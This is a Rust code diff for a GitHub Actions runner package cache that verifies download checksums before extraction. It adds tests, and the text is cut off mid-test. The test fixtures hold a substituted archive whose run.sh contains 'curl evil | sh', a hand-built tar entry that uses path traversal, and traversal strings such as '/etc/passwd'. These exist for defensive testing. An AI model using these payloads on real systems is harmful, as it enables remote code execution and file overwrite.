@@ -1154,8 +1154,24 @@ impl PackageCache {
     }
 
     /// Whether the published version is due to be re-checked.
+    ///
+    /// Three ways to answer yes, and the third is the one that matters:
+    ///
+    /// 1. The cache is empty, so there is nothing to reuse.
+    /// 2. [`Freshness::check_interval`] has elapsed — the bounded interval
+    ///    `05-infrastructure.md` asks for.
+    /// 3. **What we hold is already past the freshness deadline.** A stale entry
+    ///    forces a check on every cold start regardless of the interval, because
+    ///    the interval exists to save REST budget and there is no budget worth
+    ///    saving once the package on disk is one GitHub may refuse. The interval
+    ///    being far shorter than the window makes this rare in practice; it is
+    ///    written down so that the rare case is the safe one rather than the
+    ///    unconsidered one.
     fn check_is_due(&self, now: Timestamp) -> Result<bool, PackageError> {
-        if self.newest_installed()?.is_none() {
+        let Some(newest) = self.newest_installed()? else {
+            return Ok(true);
+        };
+        if self.is_stale(&newest, now) {
             return Ok(true);
         }
         let last = *self
@@ -1176,12 +1192,13 @@ impl PackageCache {
         // `select` answering `None` is refused rather than fallen back from —
         // a hardcoded URL is the substitution `07-security.md` names as the
         // threat.
-        let download = published.select(self.os, self.arch).ok_or(
-            PackageError::NoPackagePublished {
-                os: self.os,
-                arch: self.arch,
-            },
-        )?;
+        let download =
+            published
+                .select(self.os, self.arch)
+                .ok_or(PackageError::NoPackagePublished {
+                    os: self.os,
+                    arch: self.arch,
+                })?;
         let version = RunnerVersion::from_filename(&download.filename)?;
 
         // Already held: no fetch, no extraction, no rewrite.
@@ -1231,6 +1248,18 @@ impl PackageCache {
     }
 
     /// Fetch, verify, extract, commit. In that order, without exception.
+    ///
+    /// # Why the downloaded file is not inside the guarded staging directory
+    ///
+    /// [`StagingGuard`] removes the *extraction* directory on every path out of
+    /// here, which is right for a half-unpacked tree. Putting the download under
+    /// it too would have made "the partially downloaded file is removed" true
+    /// for a reason no test could distinguish from tidying up — the guard would
+    /// remove the archive whether or not the mismatch path ever did, so deleting
+    /// the removal would not turn any test red. The archive therefore lives
+    /// beside the extraction directory with its lifetime managed explicitly, at
+    /// exactly one place below, and [`Self::sweep_staging`] is the backstop for
+    /// a crash rather than the mechanism.
     async fn download_verify_and_install(
         &self,
         download: &RunnerDownload,
@@ -1239,59 +1268,25 @@ impl PackageCache {
         now: Timestamp,
     ) -> Result<InstalledPackage, PackageError> {
         let (_, kind) = ArchiveKind::split(&download.filename)?;
-        let staging = self.new_staging_dir()?;
-        let guard = StagingGuard::new(staging.clone());
-        let archive = staging.join("package.archive");
+        let staging_root = self.staging_root();
+        create_dir_all(&staging_root)?;
+        let token = uuid::Uuid::new_v4();
+        let archive = staging_root.join(format!("download-{token}.archive"));
+        let extracted = staging_root.join(token.to_string());
 
-        self.ports
-            .fetcher
-            .fetch(&download.download_url, &archive)
-            .await?;
+        let outcome = self
+            .fetch_verify_extract(download, version, expected, kind, &archive, &extracted)
+            .await;
 
-        // Verification, before extraction. The whole module exists for this
-        // ordering.
-        let archive_for_hash = archive.clone();
-        let actual = tokio::task::spawn_blocking(move || sha256_file(&archive_for_hash))
-            .await
-            .map_err(|error| PackageError::Extract {
-                detail: format!("the verification task failed: {error}"),
-            })??;
+        // The downloaded file is not part of an entry on ANY path out of here —
+        // verified, unverified, or interrupted mid-extraction. One removal,
+        // reached unconditionally, is what makes that a property rather than a
+        // hope spread over four early returns.
+        let removed = remove_file_if_present(&archive, "remove the package download");
+        let () = outcome?;
+        removed?;
 
-        if actual != *expected {
-            // The partial (or substituted) file is removed here rather than left
-            // for the staging sweep, because "the partially downloaded file is
-            // removed" is a property this module owes on the mismatch path
-            // specifically, not a side effect of tidying up later.
-            if let Err(source) = fs::remove_file(&archive)
-                && source.kind() != io::ErrorKind::NotFound
-            {
-                return Err(PackageError::Io {
-                    what: "remove the unverified package download",
-                    path: archive.clone(),
-                    source,
-                });
-            }
-            return Err(PackageError::ChecksumMismatch {
-                version: version.clone(),
-                expected: expected.clone(),
-                actual,
-            });
-        }
-
-        let extracted = staging.join("root");
-        let archive_for_extract = archive.clone();
-        let extracted_for_task = extracted.clone();
-        tokio::task::spawn_blocking(move || {
-            extract(&archive_for_extract, kind, &extracted_for_task)
-        })
-        .await
-        .map_err(|error| PackageError::Extract {
-            detail: format!("the extraction task failed: {error}"),
-        })??;
-
-        // The archive has served its purpose; it is not part of the entry.
-        let _ = fs::remove_file(&archive);
-
+        let guard = StagingGuard::new(extracted.clone());
         let manifest = Manifest {
             version: version.clone(),
             digest: expected.clone(),
@@ -1329,6 +1324,53 @@ impl PackageCache {
             installed_at: now,
             digest: expected.clone(),
         })
+    }
+
+    /// Everything between the fetch and the commit: the ordering this module
+    /// exists to enforce.
+    ///
+    /// Split out from its caller so that the downloaded file has exactly one
+    /// removal site regardless of which of these steps failed.
+    async fn fetch_verify_extract(
+        &self,
+        download: &RunnerDownload,
+        version: &RunnerVersion,
+        expected: &Sha256Hex,
+        kind: ArchiveKind,
+        archive: &Path,
+        extracted: &Path,
+    ) -> Result<(), PackageError> {
+        self.ports
+            .fetcher
+            .fetch(&download.download_url, archive)
+            .await?;
+
+        // Verification, before extraction. Nothing between these two statements
+        // may ever unpack anything.
+        let archive_for_hash = archive.to_path_buf();
+        let actual = tokio::task::spawn_blocking(move || sha256_file(&archive_for_hash))
+            .await
+            .map_err(|error| PackageError::Extract {
+                detail: format!("the verification task failed: {error}"),
+            })??;
+
+        if actual != *expected {
+            return Err(PackageError::ChecksumMismatch {
+                version: version.clone(),
+                expected: expected.clone(),
+                actual,
+            });
+        }
+
+        let archive_for_extract = archive.to_path_buf();
+        let extracted_for_task = extracted.to_path_buf();
+        tokio::task::spawn_blocking(move || {
+            extract(&archive_for_extract, kind, &extracted_for_task)
+        })
+        .await
+        .map_err(|error| PackageError::Extract {
+            detail: format!("the extraction task failed: {error}"),
+        })?
     }
 
     // -- reading the cache -------------------------------------------------
@@ -1615,12 +1657,6 @@ impl PackageCache {
         self.root.join(STAGING_DIR)
     }
 
-    fn new_staging_dir(&self) -> Result<PathBuf, PackageError> {
-        let dir = self.staging_root().join(uuid::Uuid::new_v4().to_string());
-        create_dir_all(&dir)?;
-        Ok(dir)
-    }
-
     /// Remove staging litter left by an interrupted install.
     ///
     /// Nothing under `.staging/` is ever part of an entry, so this is always
@@ -1644,7 +1680,15 @@ impl PackageCache {
         };
         let mut swept = 0;
         for entry in entries.flatten() {
-            if fs::remove_dir_all(entry.path()).is_ok() {
+            let path = entry.path();
+            // Both shapes live here: `download-<uuid>.archive` files and
+            // `<uuid>/` extraction directories.
+            let removed = if path.is_dir() {
+                fs::remove_dir_all(&path).is_ok()
+            } else {
+                fs::remove_file(&path).is_ok()
+            };
+            if removed {
                 swept += 1;
             }
         }
@@ -1889,6 +1933,22 @@ fn set_executable(_path: &Path, _mode: Option<u32>) -> Result<(), PackageError> 
 // Small filesystem helpers
 // ---------------------------------------------------------------------------
 
+/// Remove a file, treating "it was not there" as success.
+///
+/// Any other failure is reported: a download that could not be deleted is a
+/// package sitting unverified on the operator's disk, which is worth a word.
+fn remove_file_if_present(path: &Path, what: &'static str) -> Result<(), PackageError> {
+    match fs::remove_file(path) {
+        Ok(()) => Ok(()),
+        Err(source) if source.kind() == io::ErrorKind::NotFound => Ok(()),
+        Err(source) => Err(PackageError::Io {
+            what,
+            path: path.to_path_buf(),
+            source,
+        }),
+    }
+}
+
 fn create_dir_all(path: &Path) -> Result<(), PackageError> {
     fs::create_dir_all(path).map_err(|source| PackageError::Io {
         what: "create a runner package cache directory",
@@ -1927,4 +1987,1832 @@ fn read_json<T: for<'de> Deserialize<'de>>(path: &Path) -> Result<Option<T>, Pac
         }
     };
     Ok(serde_json::from_slice(&bytes).ok())
+}
+
+// ---------------------------------------------------------------------------
+// Tests
+// ---------------------------------------------------------------------------
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    use std::collections::BTreeMap;
+    use std::io::Write as _;
+    use std::sync::atomic::{AtomicUsize, Ordering};
+
+    use runner_manager_domain::attempt::AttemptState;
+    use runner_manager_testkit::clock::FakeClock;
+    use runner_manager_testkit::fixtures;
+    use runner_manager_testkit::github as gh;
+
+    // -- archive fixtures --------------------------------------------------
+
+    /// A real `.zip`, built in memory.
+    fn zip_bytes(entries: &[(&str, &str)]) -> Vec<u8> {
+        let mut writer = zip::ZipWriter::new(io::Cursor::new(Vec::new()));
+        let options = zip::write::SimpleFileOptions::default();
+        for (name, body) in entries {
+            writer
+                .start_file(*name, options)
+                .expect("start a zip entry");
+            writer
+                .write_all(body.as_bytes())
+                .expect("write a zip entry");
+        }
+        writer.finish().expect("finish the zip").into_inner()
+    }
+
+    /// A real `.tar.gz`, built in memory.
+    fn tar_gz_bytes(entries: &[(&str, &str)]) -> Vec<u8> {
+        let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
+        let mut builder = tar::Builder::new(encoder);
+        for (name, body) in entries {
+            let mut header = tar::Header::new_gnu();
+            header.set_size(body.len() as u64);
+            header.set_mode(0o644);
+            header.set_cksum();
+            builder
+                .append_data(&mut header, name, body.as_bytes())
+                .expect("append a tar entry");
+        }
+        builder
+            .into_inner()
+            .expect("finish the tar")
+            .finish()
+            .expect("finish the gzip")
+    }
+
+    /// A `.tar.gz` carrying an entry name that `tar::Builder` refuses to write.
+    ///
+    /// `append_data` rejects a path containing `..` outright — "paths in
+    /// archives must not have `..`" — which is a fine default and a useless
+    /// fixture: an attacker does not use `tar::Builder`. The header is
+    /// therefore filled in by hand and appended raw, so the archive under test
+    /// is the archive a hostile producer would actually emit.
+    fn tar_gz_with_raw_name(name: &str, body: &str) -> Vec<u8> {
+        let mut header = tar::Header::new_gnu();
+        header.set_size(body.len() as u64);
+        header.set_mode(0o644);
+        header.set_entry_type(tar::EntryType::Regular);
+        {
+            let gnu = header.as_gnu_mut().expect("a GNU header");
+            let bytes = name.as_bytes();
+            assert!(bytes.len() < gnu.name.len(), "the fixture name must fit");
+            gnu.name[..bytes.len()].copy_from_slice(bytes);
+        }
+        header.set_cksum();
+
+        let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
+        let mut builder = tar::Builder::new(encoder);
+        builder
+            .append(&header, body.as_bytes())
+            .expect("append a raw tar entry");
+        builder
+            .into_inner()
+            .expect("finish the tar")
+            .finish()
+            .expect("finish the gzip")
+    }
+
+    /// The two entries every fixture package carries.
+    fn package_entries() -> Vec<(&'static str, &'static str)> {
+        vec![
+            ("run.sh", "#!/bin/sh\necho runner\n"),
+            ("bin/Runner.Listener", "listener\n"),
+        ]
+    }
+
+    fn hex_digest(bytes: &[u8]) -> String {
+        let mut hasher = Sha256::new();
+        hasher.update(bytes);
+        hex::encode(hasher.finalize())
+    }
+
+    /// Build one published-download record.
+    fn published(
+        os: &str,
+        arch: &str,
+        version: &str,
+        extension: &str,
+        digest: Option<&str>,
+    ) -> RunnerDownload {
+        let filename = format!("actions-runner-{os}-{arch}-{version}{extension}");
+        RunnerDownload {
+            os: os.to_string(),
+            architecture: arch.to_string(),
+            download_url: format!(
+                "https://github.com/actions/runner/releases/download/v{version}/{filename}"
+            ),
+            filename,
+            sha256_checksum: digest.map(str::to_string),
+        }
+    }
+
+    // -- fake ports --------------------------------------------------------
+
+    #[derive(Debug, Clone)]
+    enum Answer {
+        Downloads(Vec<RunnerDownload>),
+        Rejected,
+        Unavailable,
+    }
+
+    #[derive(Debug)]
+    struct FakeCatalog {
+        answer: Mutex<Answer>,
+        calls: AtomicUsize,
+    }
+
+    impl FakeCatalog {
+        fn with(downloads: Vec<RunnerDownload>) -> Arc<Self> {
+            Self::answering(Answer::Downloads(downloads))
+        }
+
+        fn answering(answer: Answer) -> Arc<Self> {
+            Arc::new(Self {
+                answer: Mutex::new(answer),
+                calls: AtomicUsize::new(0),
+            })
+        }
+
+        fn publish(&self, downloads: Vec<RunnerDownload>) {
+            *self.answer.lock().unwrap() = Answer::Downloads(downloads);
+        }
+
+        fn calls(&self) -> usize {
+            self.calls.load(Ordering::SeqCst)
+        }
+    }
+
+    #[async_trait::async_trait]
+    impl DownloadCatalog for FakeCatalog {
+        async fn published(&self) -> Result<RunnerDownloads, PackageError> {
+            self.calls.fetch_add(1, Ordering::SeqCst);
+            let answer = self.answer.lock().unwrap().clone();
+            match answer {
+                Answer::Downloads(entries) => Ok(RunnerDownloads::new(entries)),
+                Answer::Rejected => Err(PackageError::VersionRejected {
+                    version: None,
+                    detail: Some("the runner version is no longer supported".to_string()),
+                }),
+                Answer::Unavailable => Err(PackageError::CatalogUnavailable {
+                    detail: "502 Bad Gateway".to_string(),
+                }),
+            }
+        }
+    }
+
+    #[derive(Debug)]
+    struct FakeFetcher {
+        payload: Mutex<Vec<u8>>,
+        /// Every `(url, destination)` this fetcher was asked for, in order.
+        calls: Mutex<Vec<(String, PathBuf)>>,
+        /// Destinations that genuinely existed on disk immediately after the
+        /// fetch returned. This is what stops the "partial file is removed"
+        /// assertion from passing over a file that was never created.
+        wrote: Mutex<Vec<PathBuf>>,
+        fail: Mutex<bool>,
+    }
+
+    impl FakeFetcher {
+        fn with(payload: Vec<u8>) -> Arc<Self> {
+            Arc::new(Self {
+                payload: Mutex::new(payload),
+                calls: Mutex::new(Vec::new()),
+                wrote: Mutex::new(Vec::new()),
+                fail: Mutex::new(false),
+            })
+        }
+
+        fn serve(&self, payload: Vec<u8>) {
+            *self.payload.lock().unwrap() = payload;
+        }
+
+        fn calls(&self) -> Vec<(String, PathBuf)> {
+            self.calls.lock().unwrap().clone()
+        }
+
+        fn count(&self) -> usize {
+            self.calls.lock().unwrap().len()
+        }
+
+        fn wrote(&self) -> Vec<PathBuf> {
+            self.wrote.lock().unwrap().clone()
+        }
+    }
+
+    #[async_trait::async_trait]
+    impl PackageFetcher for FakeFetcher {
+        async fn fetch(&self, url: &str, destination: &Path) -> Result<u64, PackageError> {
+            self.calls
+                .lock()
+                .unwrap()
+                .push((url.to_string(), destination.to_path_buf()));
+            if *self.fail.lock().unwrap() {
+                return Err(PackageError::Download {
+                    detail: "connection reset".to_string(),
+                });
+            }
+            let payload = self.payload.lock().unwrap().clone();
+            fs::write(destination, &payload).expect("the fake fetcher writes its payload");
+            assert!(
+                destination.is_file(),
+                "the fake fetcher must actually create the file, or every \
+                 assertion about removing it is vacuous"
+            );
+            self.wrote.lock().unwrap().push(destination.to_path_buf());
+            Ok(payload.len() as u64)
+        }
+    }
+
+    // -- harness -----------------------------------------------------------
+
+    struct Harness {
+        _dir: tempfile::TempDir,
+        paths: AppPaths,
+        catalog: Arc<FakeCatalog>,
+        fetcher: Arc<FakeFetcher>,
+        clock: Arc<FakeClock>,
+    }
+
+    impl Harness {
+        fn new(downloads: Vec<RunnerDownload>, payload: Vec<u8>) -> Self {
+            let dir = tempfile::tempdir().expect("a temporary root");
+            let paths = AppPaths::rooted_at(dir.path());
+            Self {
+                _dir: dir,
+                paths,
+                catalog: FakeCatalog::with(downloads),
+                fetcher: FakeFetcher::with(payload),
+                clock: Arc::new(FakeClock::default()),
+            }
+        }
+
+        fn with_catalog(mut self, catalog: Arc<FakeCatalog>) -> Self {
+            self.catalog = catalog;
+            self
+        }
+
+        fn cache(&self) -> PackageCache {
+            self.cache_for(Os::Linux, Arch::X64)
+        }
+
+        fn cache_for(&self, os: Os, arch: Arch) -> PackageCache {
+            PackageCache::new(
+                &self.paths,
+                os,
+                arch,
+                CachePorts {
+                    catalog: self.catalog.clone(),
+                    fetcher: self.fetcher.clone(),
+                    backoff: Arc::new(NoBackoff),
+                    clock: self.clock.clone(),
+                },
+            )
+        }
+    }
+
+    /// One `.tar.gz` package published for `linux/x64`, with the digest GitHub
+    /// would have published for those exact bytes.
+    fn linux_fixture() -> (Harness, Vec<u8>, String) {
+        let payload = tar_gz_bytes(&package_entries());
+        let digest = hex_digest(&payload);
+        let downloads = vec![published(
+            "linux",
+            "x64",
+            "2.330.0",
+            ".tar.gz",
+            Some(&digest),
+        )];
+        (Harness::new(downloads, payload.clone()), payload, digest)
+    }
+
+    /// Every file under `root`, keyed by its path relative to `root`, valued by
+    /// `(length, modified-time, content-digest)`.
+    ///
+    /// Used to prove a directory was not rewritten. A content digest alone
+    /// would miss a rewrite with identical bytes; a modification time alone is
+    /// coarse on some filesystems. Together with a marker file the test plants
+    /// itself, the three cover each other.
+    fn snapshot(root: &Path) -> BTreeMap<String, (u64, std::time::SystemTime, String)> {
+        fn walk(
+            base: &Path,
+            dir: &Path,
+            out: &mut BTreeMap<String, (u64, std::time::SystemTime, String)>,
+        ) {
+            for entry in fs::read_dir(dir).expect("read a snapshot directory") {
+                let entry = entry.expect("a snapshot entry");
+                let path = entry.path();
+                if path.is_dir() {
+                    walk(base, &path, out);
+                    continue;
+                }
+                let relative = path
+                    .strip_prefix(base)
+                    .expect("a path under the snapshot root")
+                    .to_string_lossy()
+                    .replace('\\', "/");
+                let metadata = entry.metadata().expect("snapshot metadata");
+                let bytes = fs::read(&path).expect("snapshot contents");
+                out.insert(
+                    relative,
+                    (
+                        metadata.len(),
+                        metadata.modified().expect("a modification time"),
+                        hex_digest(&bytes),
+                    ),
+                );
+            }
+        }
+        let mut out = BTreeMap::new();
+        if root.is_dir() {
+            walk(root, root, &mut out);
+        }
+        out
+    }
+
+    /// Every path under `root`, for asserting that nothing landed somewhere.
+    fn all_paths(root: &Path) -> Vec<String> {
+        fn walk(base: &Path, dir: &Path, out: &mut Vec<String>) {
+            let Ok(entries) = fs::read_dir(dir) else {
+                return;
+            };
+            for entry in entries.flatten() {
+                let path = entry.path();
+                out.push(
+                    path.strip_prefix(base)
+                        .unwrap_or(&path)
+                        .to_string_lossy()
+                        .replace('\\', "/"),
+                );
+                if path.is_dir() {
+                    walk(base, &path, out);
+                }
+            }
+        }
+        let mut out = Vec::new();
+        walk(root, root, &mut out);
+        out.sort();
+        out
+    }
+
+    fn version(raw: &str) -> RunnerVersion {
+        RunnerVersion::parse(raw).expect("a well-formed test version")
+    }
+
+    // =====================================================================
+    // Value types: the version is a path component, so parsing it is a
+    // security control rather than a convenience.
+    // =====================================================================
+
+    #[test]
+    fn a_version_is_two_to_four_runs_of_digits_and_nothing_else() {
+        for good in ["2.330.0", "2.9", "1.2.3.4", "0.0.0"] {
+            assert!(
+                RunnerVersion::parse(good).is_ok(),
+                "`{good}` should parse as a version"
+            );
+        }
+        // Everything here would be a usable path component, a traversal, or an
+        // absolute path if it reached `Path::join`.
+        for bad in [
+            "",
+            ".",
+            "..",
+            "../..",
+            "2",
+            "2.330.0.1.2",
+            "a.b",
+            "2.330.x",
+            "2/330",
+            "2\\330",
+            "/2.330.0",
+            "C:2.330.0",
+            "2.330.0 ",
+            " 2.330.0",
+            "2..0",
+            "2.330.0/../..",
+        ] {
+            assert!(
+                RunnerVersion::parse(bad).is_err(),
+                "`{bad}` must be refused: it becomes a directory name"
+            );
+        }
+    }
+
+    #[test]
+    fn a_parsed_version_is_a_single_safe_path_component() {
+        // The property the parser exists to buy, asserted directly rather than
+        // inferred from the rejection list above.
+        let parsed = version("2.330.0");
+        let joined = Path::new("root").join(parsed.as_str());
+        assert_eq!(
+            joined.components().count(),
+            2,
+            "a version must add exactly one component to a path"
+        );
+        assert!(
+            !joined
+                .components()
+                .any(|c| matches!(c, Component::ParentDir | Component::RootDir)),
+            "a version must never introduce a traversal or a root"
+        );
+    }
+
+    #[test]
+    fn versions_order_numerically_not_lexically() {
+        assert!(version("2.9.0") < version("2.10.0"));
+        assert!(version("2.330.0") > version("2.329.9"));
+    }
+
+    #[test]
+    fn a_version_is_read_out_of_the_published_filename() {
+        // GitHub's runner-downloads response carries no version field; the
+        // filename is the only signal there is.
+        assert_eq!(
+            RunnerVersion::from_filename("actions-runner-win-x64-2.330.0.zip").unwrap(),
+            version("2.330.0")
+        );
+        assert_eq!(
+            RunnerVersion::from_filename("actions-runner-linux-arm64-2.330.0.tar.gz").unwrap(),
+            version("2.330.0")
+        );
+        // The fixture `c3` ships, so this module and that one agree on shape.
+        let fixture = gh::download("osx", "arm64");
+        assert_eq!(
+            RunnerVersion::from_filename(&fixture.filename).unwrap(),
+            version("2.330.0")
+        );
+    }
+
+    #[test]
+    fn an_archive_this_agent_cannot_extract_is_refused_by_name() {
+        for bad in [
+            "actions-runner-linux-x64-2.330.0.rar",
+            "actions-runner-linux-x64-2.330.0",
+            "actions-runner-linux-x64-2.330.0.tar.xz",
+        ] {
+            let error = RunnerVersion::from_filename(bad).unwrap_err();
+            assert!(
+                matches!(error, PackageError::UnsupportedArchive { .. }),
+                "`{bad}` should be an unsupported archive, got {error:?}"
+            );
+            assert!(error.is_terminal());
+        }
+    }
+
+    #[test]
+    fn a_digest_is_sixty_four_hex_characters_normalised_to_lowercase() {
+        let upper = "A".repeat(64);
+        assert_eq!(Sha256Hex::parse(&upper).unwrap().as_str(), "a".repeat(64));
+        for bad in ["", "abc", &"g".repeat(64), &"a".repeat(63), &"a".repeat(65)] {
+            assert!(
+                Sha256Hex::parse(bad).is_err(),
+                "`{bad}` is not a SHA-256 digest"
+            );
+        }
+    }
+
+    #[test]
+    fn a_malformed_published_digest_is_a_refusal_not_a_comparison_that_never_matches() {
+        // The failure mode this parse exists to prevent: an `sha256:`-prefixed
+        // or truncated value compared as a string can never equal a real
+        // digest, so verification would refuse every package forever while
+        // looking like it worked.
+        let error = Sha256Hex::parse("sha256:9f86d081884c7d65").unwrap_err();
+        assert!(matches!(error, PackageError::MalformedDigest { .. }));
+        assert!(error.is_terminal());
+        assert!(error.operator_action().is_some());
+    }
+
+    // =====================================================================
+    // Path containment. Lexical, because it must answer for paths that do
+    // not exist yet.
+    // =====================================================================
+
+    #[test]
+    fn containment_answers_for_paths_that_do_not_exist() {
+        let root = Path::new("/cache/packages");
+        assert!(is_inside(root, Path::new("/cache/packages")));
+        assert!(is_inside(root, Path::new("/cache/packages/2.330.0/bin/x")));
+        assert!(!is_inside(root, Path::new("/cache")));
+        assert!(!is_inside(root, Path::new("/cache/packages-other/x")));
+        assert!(!is_inside(root, Path::new("/elsewhere/2.330.0")));
+        // A `..` anywhere makes the lexical answer untrustworthy, so it is
+        // never reported as contained.
+        assert!(!is_inside(root, Path::new("/cache/packages/../escape")));
+    }
+
+    #[test]
+    fn an_archive_entry_may_not_resolve_outside_the_directory_it_is_extracted_into() {
+        let root = Path::new("/cache/staging/root");
+        assert!(resolve_inside(root, Path::new("bin/x"), "bin/x").is_ok());
+        assert!(resolve_inside(root, Path::new("./bin/x"), "./bin/x").is_ok());
+        for escape in ["../escape", "../../escape", "a/../../escape", "/etc/passwd"] {
+            let error = resolve_inside(root, Path::new(escape), escape).unwrap_err();
+            assert!(
+                matches!(error, PackageError::UnsafeArchiveEntry { .. }),
+                "`{escape}` must be refused, got {error:?}"
+            );
+        }
+    }
+
+    // =====================================================================
+    // DoD 1 — the selected package matches the host, and an unsupported pair
+    // is refused before any download.
+    // =====================================================================
+
+    #[tokio::test]
+    async fn the_entry_matching_this_host_is_the_one_downloaded() {
+        let payload = tar_gz_bytes(&package_entries());
+        let digest = hex_digest(&payload);
+        // Three published packages; only one is this host's. The decoys carry
+        // the same digest so that picking the wrong one would still verify —
+        // the test must fail on *selection*, not on the checksum.
+        let harness = Harness::new(
+            vec![
+                published("win", "x64", "2.330.0", ".zip", Some(&digest)),
+                published("linux", "x64", "2.330.0", ".tar.gz", Some(&digest)),
+                published("osx", "arm64", "2.330.0", ".tar.gz", Some(&digest)),
+            ],
+            payload,
+        );
+        let cache = harness.cache_for(Os::Linux, Arch::X64);
+
+        let installed = cache.ensure_installed().await.expect("an install");
+
+        assert_eq!(installed.version(), &version("2.330.0"));
+        let calls = harness.fetcher.calls();
+        assert_eq!(calls.len(), 1);
+        assert!(
+            calls[0]
+                .0
+                .contains("actions-runner-linux-x64-2.330.0.tar.gz"),
+            "the linux/x64 package should have been fetched, not `{}`",
+            calls[0].0
+        );
+    }
+
+    #[tokio::test]
+    async fn each_documented_host_selects_its_own_published_package() {
+        // The selection path is exercised for every documented pair on every CI
+        // leg, because the format is derived from the filename rather than from
+        // the host this test happens to run on.
+        for (os, arch, token_os, token_arch, extension) in [
+            (Os::Windows, Arch::X64, "win", "x64", ".zip"),
+            (Os::MacOs, Arch::Arm64, "osx", "arm64", ".tar.gz"),
+            (Os::Linux, Arch::Arm32, "linux", "arm", ".tar.gz"),
+        ] {
+            let payload = if extension == ".zip" {
+                zip_bytes(&package_entries())
+            } else {
+                tar_gz_bytes(&package_entries())
+            };
+            let digest = hex_digest(&payload);
+            let harness = Harness::new(
+                vec![
+                    published("win", "x64", "2.330.0", ".zip", Some(&digest)),
+                    published("osx", "arm64", "2.330.0", ".tar.gz", Some(&digest)),
+                    published("linux", "arm", "2.330.0", ".tar.gz", Some(&digest)),
+                ],
+                payload,
+            );
+            let cache = harness.cache_for(os, arch);
+
+            let installed = cache
+                .ensure_installed()
+                .await
+                .unwrap_or_else(|error| panic!("{os}/{arch} should install: {error}"));
+
+            let url = &harness.fetcher.calls()[0].0;
+            assert!(
+                url.contains(&format!("actions-runner-{token_os}-{token_arch}-")),
+                "{os}/{arch} fetched `{url}`"
+            );
+            assert!(installed.root().join("run.sh").is_file());
+        }
+    }
+
+    #[tokio::test]
+    async fn an_undocumented_host_is_refused_before_anything_is_requested() {
+        let (harness, _, _) = linux_fixture();
+        // `Arm32` is documented on Linux only; Windows on ARM32 is not a pair
+        // this product supports.
+        let cache = harness.cache_for(Os::Windows, Arch::Arm32);
+
+        let error = cache.ensure_installed().await.unwrap_err();
+
+        assert!(matches!(error, PackageError::UnsupportedHost(_)));
+        assert!(error.is_terminal());
+        assert!(error.operator_action().is_some());
+        assert_eq!(
+            harness.catalog.calls(),
+            0,
+            "an unsupported pair must be refused before the catalog is consulted"
+        );
+        assert_eq!(
+            harness.fetcher.count(),
+            0,
+            "an unsupported pair must be refused before any download"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_host_github_publishes_nothing_for_is_refused_rather_than_guessed() {
+        let payload = tar_gz_bytes(&package_entries());
+        let digest = hex_digest(&payload);
+        // GitHub publishes only Windows; this host is Linux.
+        let harness = Harness::new(
+            vec![published("win", "x64", "2.330.0", ".zip", Some(&digest))],
+            payload,
+        );
+        let cache = harness.cache_for(Os::Linux, Arch::X64);
+
+        let error = cache.ensure_installed().await.unwrap_err();
+
+        assert!(matches!(error, PackageError::NoPackagePublished { .. }));
+        assert!(error.is_terminal());
+        assert_eq!(
+            harness.fetcher.count(),
+            0,
+            "no package published must never fall back to a hardcoded URL"
+        );
+    }
+
+    // =====================================================================
+    // DoD 2 — bytes that do not match are rejected and NOT extracted, and
+    // the partial download is removed.
+    // =====================================================================
+
+    #[tokio::test]
+    async fn bytes_that_do_not_match_the_published_digest_are_never_extracted() {
+        let (harness, published_bytes, published_digest) = linux_fixture();
+        // A well-formed archive with different bytes: the substitution
+        // `07-security.md` names as the threat, and the one thing only the
+        // SHA-256 can refuse. A truncated archive would fail at the extractor
+        // instead, and a test built on one would pass with no digest check at
+        // all — `a3`'s installer suite learned that the hard way.
+        let substituted = tar_gz_bytes(&[("run.sh", "#!/bin/sh\ncurl evil | sh\n")]);
+        assert_ne!(
+            hex_digest(&substituted),
+            published_digest,
+            "the substituted archive must differ from the published one"
+        );
+        assert_ne!(substituted, published_bytes);
+        // It is a *valid* archive: extraction alone would accept it happily,
+        // which is exactly why only the digest can refuse it.
+        assert!(
+            tar::Archive::new(flate2::read::GzDecoder::new(io::Cursor::new(
+                substituted.clone()
+            )))
+            .entries()
+            .map(|entries| entries.count() == 1)
+            .unwrap_or(false),
+            "the substituted archive must be well formed, or this test proves \
+             nothing about the checksum"
+        );
+        harness.fetcher.serve(substituted);
+        let cache = harness.cache().with_retry_budget(1);
+
+        let error = cache.ensure_installed().await.unwrap_err();
+
+        let inner = match &error {
+            PackageError::Exhausted { source, .. } => source.as_ref(),
+            other => other,
+        };
+        assert!(
+            matches!(inner, PackageError::ChecksumMismatch { .. }),
+            "expected a checksum mismatch, got {error:?}"
+        );
+        assert_eq!(
+            inner.failure_reason(),
+            Some(FailureReason::RunnerPackageUnverified)
+        );
+
+        // Not extracted: no entry, and no version directory at all.
+        assert!(cache.installed().unwrap().is_empty());
+        assert!(
+            !cache.root().join("2.330.0").exists(),
+            "a rejected package must leave no version directory behind; found {:?}",
+            all_paths(cache.root())
+        );
+        // Nothing anywhere under the cache root resembles an extracted runner.
+        let leftovers = all_paths(cache.root());
+        assert!(
+            !leftovers.iter().any(|path| path.ends_with("run.sh")),
+            "nothing from the archive may have been unpacked; found {leftovers:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn the_unverified_download_is_removed_from_disk() {
+        let (harness, _, _) = linux_fixture();
+        harness
+            .fetcher
+            .serve(tar_gz_bytes(&[("run.sh", "substituted\n")]));
+        let cache = harness.cache().with_retry_budget(1);
+
+        let error = cache.ensure_installed().await.unwrap_err();
+        assert!(error.failure_reason().is_some());
+
+        // The fetcher asserts internally that it created the file, and records
+        // the path only after that assertion. Without this, "the file is gone"
+        // would be true of a file that never existed.
+        let wrote = harness.fetcher.wrote();
+        assert_eq!(wrote.len(), 1, "the fetcher must have written exactly once");
+        assert!(
+            !wrote[0].exists(),
+            "the unverified download at {:?} must have been removed",
+            wrote[0]
+        );
+
+        // And no other copy of it survives anywhere in the cache.
+        let leftovers = all_paths(cache.root());
+        assert!(
+            !leftovers.iter().any(|path| path.ends_with(".archive")),
+            "no downloaded archive may survive a mismatch; found {leftovers:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_checksum_mismatch_is_retryable_and_clean_bytes_still_install() {
+        // `03-control-flows.md`: a download checksum failure is retried with
+        // bounded backoff. The usual cause is a truncated transfer, and the
+        // next attempt gets clean bytes.
+        let (harness, good, _) = linux_fixture();
+        harness
+            .fetcher
